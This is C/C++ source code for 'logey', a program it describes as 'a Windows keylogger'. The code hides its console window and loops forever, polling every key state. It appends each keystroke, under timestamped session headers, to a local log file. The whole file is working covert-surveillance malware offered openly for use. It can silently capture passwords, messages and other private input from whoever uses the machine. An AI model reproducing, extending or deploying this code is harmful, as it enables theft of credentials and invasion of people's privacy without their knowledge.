#include "logey.h"
#include <time.h>

int main() {

	if (!debug) hideConsole();

	createNewInstanceHeader("logey.log");

	while (true) // infinite loop
	{
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				keys(i, "logey.log");
			}
		}
	}

	return 0;
}

void keys(int key, char *filename) {

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(filename, "a+");

	switch (key) {
	case VK_RETURN:
		cout << endl;
		fprintf(OUTPUT_FILE, "%s ", "\n");
		break;
	case VK_SHIFT:
		cout << "{SHIFT}";
		fprintf(OUTPUT_FILE, "%s ", "{SHIFT}");
		break;
	case VK_SPACE:
		cout << " ";
		fprintf(OUTPUT_FILE, "%s ", " ");
		break;
	case VK_BACK:
		cout << "{BACKSPACE}";
		fprintf(OUTPUT_FILE, "%s ", "{BACKSPACE}");
		break;
	case VK_CONTROL:
		cout << "{CONTROL}";
		fprintf(OUTPUT_FILE, "%s ", "{CONTROL}");
		break;
	case VK_TAB:
		cout << "{TAB}";
		fprintf(OUTPUT_FILE, "%s ", "{TAB}");
		break;
	case VK_ESCAPE:
		cout << "{ESCAPE}";
		fprintf(OUTPUT_FILE, "%s ", "{ESCAPE}");
		break;
	case VK_MENU:
		cout << "{ALT}";
		fprintf(OUTPUT_FILE, "%s ", "{ALT}");
		break;
	default:
		char x = static_cast<char>(key);
		cout << x;
		fprintf(OUTPUT_FILE, "%s ", &key);
		break;
	}

	fclose(OUTPUT_FILE);
}

void hideConsole() {
	HWND hideConsole;
	AllocConsole();
	hideConsole = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hideConsole, 0);
}

void createNewInstanceHeader(char *filename){
	time_t currentTime;
	time(&currentTime);

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(filename, "a+");

	fprintf(OUTPUT_FILE, "%s", "\n------------------");
	fprintf(OUTPUT_FILE, "%s %.2f", "\nlogey --- a Windows keylogger\nauthor: exler\nlicense: MIT\nVersion:", LOGEY_VERSION_NUMBER);
	fprintf(OUTPUT_FILE, "%s", "\n\nSession Timestamp : ");
	fprintf(OUTPUT_FILE, "%s", ctime(&currentTime));
	fprintf(OUTPUT_FILE, "%s", "\n------------------\n");

	fclose(OUTPUT_FILE);
}